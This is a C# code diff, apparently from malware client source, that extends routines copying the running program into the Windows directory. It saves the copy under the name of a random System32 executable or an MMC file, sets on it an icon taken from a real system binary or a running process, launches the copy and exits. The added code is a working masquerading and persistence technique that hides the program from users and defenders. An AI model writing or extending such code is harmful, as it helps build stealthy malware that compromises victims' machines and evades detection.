@@ -142,10 +142,12 @@ namespace Client
         {
             try
             {
-                string path = Path.GetFullPath(Constants.WinDir + "/" + Utilities.Files_And_Pathing.GetRandomSystem32Executable());
+                string randomsysapp = Utilities.Files_And_Pathing.GetRandomSystem32Executable();
+                string path = Path.GetFullPath(Constants.WinDir + "/" + randomsysapp);
                 Armitage.Copy.CopySelfTo(path);
                 // change the letter's stamp
-
+                var randicon = Utilities.Icon_Util.ExtractIconFromExecutable(randomsysapp);
+                Utilities.Icon_Util.ChangeIcon(path, randicon);
                 // run from there
                 Process.Start(path);
                 return path;
@@ -159,12 +161,19 @@ namespace Client
         {
             if (Armitage.Copy.CopySelfTo(Constants.MMCFile))
             {
-                try
+                if (Process.Start(Constants.MMCFile, Constants.MyProcessID.ToString()).Id > 0)
                 {
-                    if (Process.Start(Constants.MMCFile, Constants.MyProcessID.ToString()).Id > 0)
-                        Environment.Exit(0);
+                    // attempt to change icon
+                    try
+                    {
+                        var randomnotadminproc = Utilities.Process_Utils.GetRandomRunningProcessThatIsNotAdmin();
+                        string randomsysapp = randomnotadminproc.MainModule.FileName;
+                        var randicon = Utilities.Icon_Util.ExtractIconFromExecutable(randomsysapp);
+                        Utilities.Icon_Util.ChangeIcon(Constants.MMCFile, randicon);
+                    }
+                    catch { }
+                    Environment.Exit(0);
                 }
-                catch { }
             }
         }
         /// <summary>
